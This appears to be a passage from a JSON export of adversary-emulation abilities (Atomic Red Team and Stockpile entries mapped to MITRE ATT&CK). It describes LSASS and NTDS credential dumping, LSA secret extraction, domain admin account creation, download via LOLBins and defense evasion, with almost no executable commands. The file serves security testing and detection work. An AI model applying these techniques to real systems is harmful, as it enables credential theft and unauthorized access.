        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5091ad13565a0e0369be0998e2affd1d",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Group Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Display group policy information via gpresult",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "efc8346315601012db4a1f9afd7436a4",
        "technique_id": "T1615",
        "repeatable": false
    },
    {
        "description": "Turn a computers WIFI off",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Endpoint Denial of Service",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "wifi.sh"
                ],
                "command": "./wifi.sh off",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "./wifi.sh on"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Disrupt WIFI",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731",
        "technique_id": "T1499",
        "repeatable": false
    },
    {
        "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Do Not Connect To Win Update",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "caba55db8a5579c5244fd6cc7e3574df",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Domain Account and Group Manipulate",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "b3aef1cccb10fc2ecf00bc80646ef8fe",
        "technique_id": "T1098",
        "repeatable": false
    },
    {
        "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
        "buckets": [
            "initial-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Phishing: Spearphishing Attachment",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Download Macro-Enabled Phishing Attachment",
        "tactic": "initial-access",
        "plugin": "atomic",
        "ability_id": "1afaec09315ab71fdfb167175e8a019a",
        "technique_id": "T1566.001",
        "repeatable": false
    },
    {
        "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Download a File with Windows Defender MpCmdRun.exe",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "15d7ca52df3177e60fbd8a9c8ab66719",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Use wscript to run a local VisualBasic file to download a remote file",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Download a file using wscript",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "a43fdf7e96a3485431f079491056766c",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Download a file with IMEWDBLD.exe",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "04d33ddae0126966ae6d841267c17329",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Download a file with Microsoft Connection Manager Auto-Download",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "552e8cf1f7fdc83d9ecf2c1bf22cf51a",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump Active Directory Database with NTDSUtil",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "df3a85f892f81ee118bee2a49141710a",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump Credential Manager using keymgr.dll and rundll32.exe",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "8de14c0ea1b80dbd5de0cf5d28cff16b",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS with createdump.exe from .Net v5",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "a8911b689872a0b7060bc920440d2647",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS.exe Memory using NanoDump",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "0501437f74ad9350b96fdaf64d0fb6c7",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:SYSTEMROOT\\System32\\lsass_*.dmp.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS.exe Memory using Out-Minidump.ps1",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "0310c8a2dcab1e2bdfadf004c1141da8",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS.exe Memory using ProcDump",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "ecb6d616a6566411dc36a6510904b0ba",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS.exe Memory using comsvcs.dll",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "35d92515122effdd73801c6ac3021da7",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "16dfb3bfff123ed3be652367df062c61",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump LSASS.exe using imported Microsoft DLLs",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "36fc42ced381416ca7d5d7af0ee0561b",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "This module will extract the credentials from Windows Credential Manager",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "9d0478981edda6091f911a1305025bde",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "This module will extract the credentials from Windows Credential Manager",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "d74777514cba5a4fd4f297261ed0d8ef",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dump svchost.exe to gather RDP credentials",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "18f31c311ac208802e88ab8d5af8603e",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSA Secrets",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dumping LSA Secrets",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "adbbf2ebad58d40cb7260e0cb42e5093",
        "technique_id": "T1003.004",
        "repeatable": false
    },
    {
        "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is containted in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Compile After Delivery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dynamic C# Compile",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "238fac804625c68206069fbec5cbf49c",
        "technique_id": "T1027.004",
        "repeatable": false
    },
    {
        "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Time Providers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Edit an existing time provider",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "67fe3c9df14ec9c65b9fdeb5fcc62bb6",
        "technique_id": "T1547.003",
        "repeatable": false
    },
    {
        "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Elevated group enumeration using net group (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "548dc737f7e316338a51a0860bd9a89a",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Email Collection: Local Email Collection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Email Collection with PowerShell Get-Inbox",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "a486bd42396e6e4680f908d4dfa18870",
        "technique_id": "T1114.001",
        "repeatable": false
    },
    {
        "description": "Emulate administrator tasks on a system in a separate process",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Emulate Administrator Tasks",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Default Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enable Guest account with RDP capability and admin privileges",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "59202d45130d86feab6050a72d2047fc",
        "technique_id": "T1078.001",
        "repeatable": false
    },
    {
        "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enable Windows Remote Management",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "e643e21318c069d0a576da91650c76fe",
        "technique_id": "T1021.006",
        "repeatable": false
    },
    {
        "description": "Enabling RDP through remote registry.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enabling Remote Desktop Protocol via Remote Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6b01af3fd822ab73c2e84ad51a4be6cb",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enabling Restricted Admin Mode via Command_Prompt",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c1bbc29a5415bbc59d16c6959b421c65",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Visual Basic",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Encoded VBS code execution",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "9c955a373154a7090d4b4396b561f5da",
        "technique_id": "T1059.005",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory Computers with ADSISearcher",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "c75a55384a1e7026bb91f841e4ca2ba9",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory Computers with Get-AdComputer",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f32d25602b6c142d321b9a0965316916",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory Groups with ADSISearcher",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b45cb08e24877077d98421393bce079a",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory Groups with Get-AdGroup",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f071213a29669283eeb8ab07ddffdbfb",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8c4228fa7e1c015590d1f13d935e5bb8",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory Users with ADSISearcher",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "5a33c31395b6ef3ee38097b327c8b79d",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Active Directory for Unconstrained Delegation",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "10a0f4f8efdae71f3e88b3e20560798a",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Query Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate COM Objects in Registry with Powershell",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "54f95564a265f67159d1f8ff907cd156",
        "technique_id": "T1012",
        "repeatable": false
    },
    {
        "description": "This test will enumerate the details of the built-in domain admin account\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Default Domain Admin Details (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a2946687ae1138d23b0dc040e43d0eb5",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Linked Policies In ADSISearcher Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "196263c4c1f42138866d958193ad2ad4",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n",
        "buckets": [
            "reconnaissance"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Gather Victim Host Information: Hardware",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
